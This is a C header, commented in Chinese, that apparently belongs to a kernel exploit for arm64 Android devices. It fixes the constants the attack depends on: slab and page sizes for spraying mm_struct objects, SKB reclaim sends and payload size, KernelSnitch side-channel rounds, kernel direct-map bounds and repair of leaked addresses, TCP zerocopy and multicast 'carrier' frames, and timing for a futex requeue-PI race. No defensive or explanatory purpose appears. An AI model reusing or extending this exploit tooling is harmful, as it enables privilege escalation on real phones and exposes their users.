/**
 * @file kernel_internal.h
 * @brief 43499 内部实现依赖的物理常量（页几何、mm_struct slab、SKB 闭包、KernelSnitch 区间）。
 *
 * @note 这些常量是「已证明的物理事实」，不是 profile：Native 不读取 profile、
 *       不填默认值。Kotlin 通过 `glk43499_placement_request` 显式传入数量、边界
 *       与超时，Native 只做非零/范围/对齐/溢出/物理上限校验。
 * @note 全部为具名常量（宏或 `_Static_assert` 可验证的算术式），不引入可写全局。
 * @note 阶段：G4L-1..G4L-4T 内部实现；若日后需要按内核形态变化扩展，必须先
 *       扩展公共 ABI 并由 Kotlin 显式传入，禁止在 Native 侧读配置。
 */
#ifndef GHOSTLOCK_GL43499_CORE_KERNEL_INTERNAL_H
#define GHOSTLOCK_GL43499_CORE_KERNEL_INTERNAL_H

#include <stdint.h>

#include "abi.h"

/* ------------------------------------------------------------------------- */
/* 页与 slab 几何（mm_struct slab 是 order-3 页块）                          */
/* ------------------------------------------------------------------------- */

/** @brief 内核页大小：候选页基址与 SKB 闭包的布局边界。 */
#define GLK43499_PHYS_PAGE_SIZE UINT64_C(0x1000)

/** @brief mm_struct slab 的分配大小（order-3，8 页）。 */
#define GLK43499_PHYS_ALLOCATION_SIZE UINT64_C(0x8000)

/** @brief mm_struct slab 的伙伴阶数；`allocation == page << order`。 */
#define GLK43499_PHYS_SLAB_ORDER 3U

/** @brief 单个 `struct mm_struct` 的分配大小（slab 内候选步长）。 */
#define GLK43499_PHYS_MM_STRUCT_SIZE UINT64_C(0x500)

/** @brief 每个 mm_struct slab 的对象数：`allocation / mm_struct_size`。 */
#define GLK43499_PHYS_OBJECTS_PER_SLAB \
    (GLK43499_PHYS_ALLOCATION_SIZE / GLK43499_PHYS_MM_STRUCT_SIZE)

/**
 * @brief SKB 发送闭包长度（两个 order-3 块）。
 * @note 该长度同时是 Placement staging 缓冲、landing 复制字节与 `bytes.size`
 *       的物理上限；Kotlin 的 `reclaim_payload_size` 必须等于它。
 */
#define GLK43499_PHYS_SKB_SEND_SIZE (GLK43499_PHYS_ALLOCATION_SIZE * UINT64_C(2))

/** @brief landing 后最多执行的 reclaim `sendmsg` 次数（旧实现固定 4 次）。 */
#define GLK43499_PHYS_SKB_RECLAIM_SENDS UINT64_C(4)

/** @brief mm spray 的 partial slabs 数：`spray_count == (1 + partials) * objs`。 */
#define GLK43499_PHYS_MM_PARTIALS UINT64_C(5)

/** @brief `prepare_count == 8 * objects_per_slab` 中的 8 个 prepare slab。 */
#define GLK43499_PHYS_PREPARE_SLABS UINT64_C(8)

/** @brief 物理计数的上限；超过即拒绝，避免溢出并守住 fd/pid 预算。 */
#define GLK43499_PHYS_MAX_OBJECTS_PER_SLAB UINT64_C(64)
#define GLK43499_PHYS_MAX_CONTEXT_ENTRIES UINT64_C(512)

/* ------------------------------------------------------------------------- */
/* 内核直映射区间与泄漏地址范式                                              */
/* ------------------------------------------------------------------------- */

/** @brief arm64 VA_BITS=39 的内核直映射起始地址。 */
#define GLK43499_PHYS_IDENTITY_START UINT64_C(0xffffff8000000000)

/** @brief arm64 VA_BITS=39 的内核直映射上界（起始 + 64 GiB）。 */
#define GLK43499_PHYS_IDENTITY_END \
    (GLK43499_PHYS_IDENTITY_START + (UINT64_C(64) << 30))

/** @brief 泄漏地址的 tag nibble：补回 bits 56..59 后恢复 canonical VA。 */
#define GLK43499_PHYS_LEAK_TAG_NIBBLE UINT64_C(0xf)
#define GLK43499_PHYS_LEAK_TAG_SHIFT 56U

/* ------------------------------------------------------------------------- */
/* KernelSnitch 测量参数（编译期物理参数，不是 profile）                     */
/* ------------------------------------------------------------------------- */

/** @brief 碰撞池目标数；`kernelsnitch_setup` 要求 >= 2。 */
#define GLK43499_PHYS_SNITCH_COLLISIONS UINT64_C(4)

/** @brief Placement 测量的最大重试轮数上限；Kotlin 的 scan_round_limit 不得超出。 */
#define GLK43499_PHYS_MAX_MEASUREMENT_ROUNDS UINT64_C(8)

/* ------------------------------------------------------------------------- */
/* Carrier 物理参数                                                          */
/* ------------------------------------------------------------------------- */

/** @brief Multicast stamp 帧上限；超过即拒绝（stamp 是栈/堆上的固定小结构）。 */
#define GLK43499_PHYS_MULTICAST_MAX_FRAME UINT64_C(0x1000)

/** @brief Multicast 每次 arm 后等待 consumer 首个调用的 yield 上限。 */
#define GLK43499_PHYS_MULTICAST_ARM_HOLD UINT64_C(0x1000)

/** @brief pselect 的 `nfds` 上限：fd_set 只能表示 0..FD_SETSIZE-1。 */
#define GLK43499_PHYS_SELECT_MAX_NFDS UINT64_C(1024)

/** @brief pselect 的最少描述符数；必须留出 `nfds-1` 作为窗口 fd。 */
#define GLK43499_PHYS_SELECT_MIN_NFDS UINT64_C(4)

/** @brief TCP zerocopy 共享映射上限（64 MiB）。 */
#define GLK43499_PHYS_TCP_MAX_MAPPING (UINT64_C(1) << 26)

/** @brief TCP 发送小包与 zerocopy 请求体的公共上限（必须落在映射页内）。 */
#define GLK43499_PHYS_TCP_MAX_FRAME UINT64_C(0x1000)

/** @brief TCP punch 线程每轮等待 consumer 观察前的 yield 上限。 */
#define GLK43499_PHYS_TCP_PUNCH_SPIN UINT64_C(0x1000)

/** @brief TCP 触发后 arm consumer 前保持 poisoned frame 的 yield 上限。 */
#define GLK43499_PHYS_TCP_POST_HOLD UINT64_C(0x1000)

/**
 * @brief `struct tcp_zerocopy_receive.address` 在请求体内的固定偏移。
 * @note 该字段是内核 ABI 的第一个成员；其余字段（length/task/lock）由 Kotlin
 *       在 frame 内按物理偏移填好，Native 只填它唯一拥有的映射地址。
 */
#define GLK43499_PHYS_TCP_ZC_ADDRESS_OFFSET 0U

/** @brief 映射与发送缓冲的填充字节；内容不参与判定，只用于触页。 */
#define GLK43499_PHYS_FILL_BYTE 0x41U

/* ------------------------------------------------------------------------- */
/* PI 竞态固定参数（时序形状，不是 profile）                                 */
/* ------------------------------------------------------------------------- */

/** @brief 每次 consumer 唤醒后的连续尝试上限。 */
#define GLK43499_PHYS_CONSUMER_MAX UINT64_C(0x100)

/** @brief consumer 单轮每序列的调用预算。 */
#define GLK43499_PHYS_CONSUMER_BURST UINT64_C(8)

/** @brief sched_setattr(TID) 的重试 PI 等待时间（纳秒）。 */
#define GLK43499_PHYS_CONSUMER_LOCK_PI_SPIN_NS UINT64_C(0x4000)

/** @brief waiter 轮询粒度（微秒）；用于等待 owner 就绪等非 PI 阶段。 */
#define GLK43499_PHYS_POLL_US UINT64_C(200)

/** @brief CMP_REQUEUE_PI 前的 settle 等待（微秒）；让 waiter 落入 WAIT_REQUEUE_PI。 */
#define GLK43499_PHYS_SETUP_SETTLE_US UINT64_C(200)

/** @brief CMP_REQUEUE_PI 的期望返回值。 */
#define GLK43499_PHYS_REQUEUE_EXPECTED 1L

/** @brief disarm 时等待 consumer_inflight 归零的 yield 上限（超过即判 stuck）。 */
#define GLK43499_PHYS_DISARM_SPIN_LIMIT UINT64_C(1 << 20)

/* 编译器可验证的物理自洽性：slab 大小、对象数、staging 与页几何一致。 */
_Static_assert((GLK43499_PHYS_ALLOCATION_SIZE & (GLK43499_PHYS_ALLOCATION_SIZE - 1)) == 0,
               "allocation size must be a power of two");
_Static_assert((GLK43499_PHYS_ALLOCATION_SIZE >> GLK43499_PHYS_SLAB_ORDER) ==
                   GLK43499_PHYS_PAGE_SIZE,
               "allocation size must equal page_size << slab_order");
_Static_assert(GLK43499_PHYS_OBJECTS_PER_SLAB >= 1,
               "objects per slab must be non zero");
_Static_assert(GLK43499_PHYS_SKB_SEND_SIZE == GLK43499_PHYS_ALLOCATION_SIZE * 2,
               "SKB send closure is two allocation blocks");
_Static_assert(GLK43499_PHYS_IDENTITY_END > GLK43499_PHYS_IDENTITY_START,
               "identity window must be non empty");
_Static_assert(GLK43499_PHYS_SELECT_MAX_NFDS <= 1024,
               "fd_set capacity is bounded by FD_SETSIZE");

#endif /* GHOSTLOCK_GL43499_CORE_KERNEL_INTERNAL_H */
